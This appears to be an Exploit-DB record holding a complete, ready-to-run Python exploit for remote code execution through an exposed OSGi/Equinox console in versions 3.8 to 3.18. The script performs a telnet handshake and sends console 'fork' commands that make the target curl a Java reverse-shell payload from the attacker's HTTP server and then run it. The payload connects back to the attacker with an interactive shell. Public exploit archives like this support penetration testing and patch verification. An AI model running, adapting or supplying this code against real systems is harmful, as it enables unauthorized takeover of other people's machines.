{"source": "https://www.exploit-db.com/exploits/51878", "vulnName": "OSGi v3.8-3.18 Console - RCE", "vulnEDBID": "51878", "vulnCVE": "N/A", "author": "ANDRZEJ OLCHAWA, MILENKO STARCIK", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-12", "vulnContent": "#!/usr/bin/python\n\n# Exploit Title: [OSGi v3.8-3.18 Console RCE]\n# Date: [2023-07-28]\n# Exploit Author: [Andrzej Olchawa, Milenko Starcik,\n#                  VisionSpace Technologies GmbH]\n# Exploit Repository:\n#           [https://github.com/visionspacetec/offsec-osgi-exploits.git]\n# Vendor Homepage: [https://eclipse.dev/equinox]\n# Software Link: [https://archive.eclipse.org/equinox/]\n# Version: [3.8 - 3.18]\n# Tested on: [Linux kali 6.3.0-kali1-amd64]\n# License: [MIT]\n#\n# Usage:\n# python exploit.py --help\n#\n# Example:\n# python exploit.py --rhost=192.168.0.133 --rport=1337 --lhost=192.168.0.100 \\\n#                                                      --lport=4444\n\n\"\"\"\nThis is an exploit that allows to open a reverse shell connection from\nthe system running OSGi v3.8-3.18 and earlier.\n\"\"\"\nimport argparse\nimport socket\nimport sys\nimport threading\n\nfrom functools import partial\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\n# Stage 1 of the handshake message\nHANDSHAKE_STAGE_1 = \\\n    b\"\\xff\\xfd\\x01\\xff\\xfd\" \\\n    b\"\\x03\\xff\\xfb\\x1f\\xff\" \\\n    b\"\\xfa\\x1f\\x00\\x74\\x00\" \\\n    b\"\\x37\\xff\\xf0\\xff\\xfb\" \\\n    b\"\\x18\"\n\n# Stage 2 of the handshake message\nHANDSHAKE_STAGE_2 = \\\n    b\"\\xff\\xfa\\x18\\x00\\x58\" \\\n    b\"\\x54\\x45\\x52\\x4d\\x2d\" \\\n    b\"\\x32\\x35\\x36\\x43\\x4f\" \\\n    b\"\\x4c\\x4f\\x52\\xff\\xf0\"\n\n# The buffer of this size is enough to handle the telnet handshake\nBUFFER_SIZE = 2 * 1024\n\n\nclass HandlerClass(BaseHTTPRequestHandler):\n    \"\"\"\n    This class overrides the BaseHTTPRequestHandler. It provides a specific\n    functionality used to deliver a payload to the target host.\n    \"\"\"\n\n    _lhost: str\n    _lport: int\n\n    def __init__(self, lhost, lport, *args, **kwargs):\n        self._lhost = lhost\n        self._lport = lport\n\n        super().__init__(*args, **kwargs)\n\n    def _set_response(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n\n    def do_GET(self):  # pylint: disable=C0103\n        \"\"\"\n        This method is responsible for the playload delivery.\n        \"\"\"\n\n        print(\"Delivering the payload...\")\n\n        self._set_response()\n        self.wfile.write(generate_revshell_payload(\n            self._lhost, self._lport).encode('utf-8'))\n\n        raise KeyboardInterrupt\n\n    def log_message(self, format, *args):  # pylint: disable=W0622\n        \"\"\"\n        This method redefines a built-in method to suppress\n        BaseHTTPRequestHandler log messages.\n        \"\"\"\n\n        return\n\n\ndef generate_revshell_payload(lhost, lport):\n    \"\"\"\n    This function generates the Revershe Shell payload that will\n    be executed on the target host.\n    \"\"\"\n\n    payload = \\\n        \"import java.io.IOException;import java.io.InputStream;\" \\\n        \"import java.io.OutputStream;import java.net.Socket;\" \\\n        \"class RevShell {public static void main(String[] args) \" \\\n        \"throws Exception { String host=\\\"%s\\\";int port=%d;\" \\\n        \"String cmd=\\\"sh\\\";Process p=new ProcessBuilder(cmd).\" \\\n        \"redirectErrorStream(true).start();Socket s=new Socket(host,port);\" \\\n        \"InputStream pi=p.getInputStream(),pe=p.getErrorStream(), \" \\\n        \"si=s.getInputStream();OutputStream po=p.getOutputStream(),\" \\\n        \"so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\" \\\n        \">0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());\" \\\n        \"while(si.available()>0)po.write(si.read());so.flush();po.flush();\" \\\n        \"Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};\" \\\n        \"p.destroy();s.close();}}\\n\" % (\n            lhost, lport)\n\n    return payload\n\n\ndef run_payload_delivery(lhost, lport):\n    \"\"\"\n    This function is responsible for payload delivery.\n    \"\"\"\n\n    print(\"Setting up the HTTP server for payload delivery...\")\n\n    handler_class = partial(HandlerClass, lhost, lport)\n\n    server_address = ('', 80)\n    httpd = HTTPServer(server_address, handler_class)\n\n    try:\n        print(\"[+] HTTP server is running.\")\n\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        print(\"[+] Payload delivered.\")\n    except Exception as err:  # pylint: disable=broad-except\n        print(\"[-] Failed payload delivery!\")\n        print(err)\n    finally:\n        httpd.server_close()\n\n\ndef generate_stage_1(lhost):\n    \"\"\"\n    This function generates the stage 1 of the payload.\n    \"\"\"\n\n    stage_1 = b\"fork \\\"curl http://%s -o ./RevShell.java\\\"\\n\" % (\n        lhost.encode()\n    )\n\n    return stage_1\n\n\ndef generate_stage_2():\n    \"\"\"\n    This function generates the stage 2 of the payload.\n    \"\"\"\n\n    stage_2 = b\"fork \\\"java ./RevShell.java\\\"\\n\"\n\n    return stage_2\n\n\ndef establish_connection(rhost, rport):\n    \"\"\"\n    This function creates a socket and establishes the connection\n    to the target host.\n    \"\"\"\n\n    print(\"[*] Connecting to OSGi Console...\")\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((rhost, rport))\n    print(\"[+] Connected.\")\n\n    return sock\n\n\ndef process_handshake(sock):\n    \"\"\"\n    This function process the handshake with the target host.\n    \"\"\"\n\n    print(\"[*] Processing the handshake...\")\n    sock.recv(BUFFER_SIZE)\n    sock.send(HANDSHAKE_STAGE_1)\n    sock.recv(BUFFER_SIZE)\n    sock.send(HANDSHAKE_STAGE_2)\n    sock.recv(BUFFER_SIZE)\n    sock.recv(BUFFER_SIZE)\n\n\ndef deliver_payload(sock, lhost):\n    \"\"\"\n    This function executes the first stage of the exploitation.\n    It triggers the payload delivery mechanism to the target host.\n    \"\"\"\n\n    stage_1 = generate_stage_1(lhost)\n\n    print(\"[*] Triggering the payload delivery...\")\n    sock.send(stage_1)\n    sock.recv(BUFFER_SIZE)\n    sock.recv(BUFFER_SIZE)\n\n\ndef execute_payload(sock):\n    \"\"\"\n    This function executes the second stage of the exploitation.\n    It sends payload which is responsible for code execution.\n    \"\"\"\n\n    stage_2 = generate_stage_2()\n\n    print(\"[*] Executing the payload...\")\n    sock.send(stage_2)\n    sock.recv(BUFFER_SIZE)\n    sock.recv(BUFFER_SIZE)\n    print(\"[+] Payload executed.\")\n\n\ndef exploit(args, thread):\n    \"\"\"\n    This function sends the multistaged payload to the tareget host.\n    \"\"\"\n\n    try:\n        sock = establish_connection(args.rhost, args.rport)\n\n        process_handshake(sock)\n        deliver_payload(sock, args.lhost)\n\n        # Join the thread running the HTTP server\n        # and wait for payload delivery\n        thread.join()\n\n        execute_payload(sock)\n\n        sock.close()\n\n        print(\"[+] Done.\")\n    except socket.error as err:\n        print(\"[-] Could not connect!\")\n        print(err)\n        sys.exit()\n\n\ndef parse():\n    \"\"\"\n    This fnction is used to parse and return command-line arguments.\n    \"\"\"\n\n    parser = argparse.ArgumentParser(\n        prog=\"OSGi-3.8-console-RCE\",\n        description=\"This tool will let you open a reverse shell from the \"\n                    \"system that is running OSGi with the '-console' \"\n                    \"option in versions between 3.8 and 3.18.\",\n        epilog=\"Happy Hacking! :)\",\n    )\n\n    parser.add_argument(\"--rhost\", dest=\"rhost\",\n                        help=\"remote host\", type=str, required=True)\n    parser.add_argument(\"--rport\", dest=\"rport\",\n                        help=\"remote port\", type=int, required=True)\n    parser.add_argument(\"--lhost\", dest=\"lhost\",\n                        help=\"local host\", type=str, required=False)\n    parser.add_argument(\"--lport\", dest=\"lport\",\n                        help=\"local port\", type=int, required=False)\n    parser.add_argument(\"--version\", action=\"version\",\n                        version=\"%(prog)s 0.1.0\")\n\n    return parser.parse_args()\n\n\ndef main(args):\n    \"\"\"\n    Main fuction.\n    \"\"\"\n\n    thread = threading.Thread(\n        target=run_payload_delivery, args=(args.lhost, args.lport))\n    thread.start()\n\n    exploit(args, thread)\n\n\nif __name__ == \"__main__\":\n    main(parse())\n            "}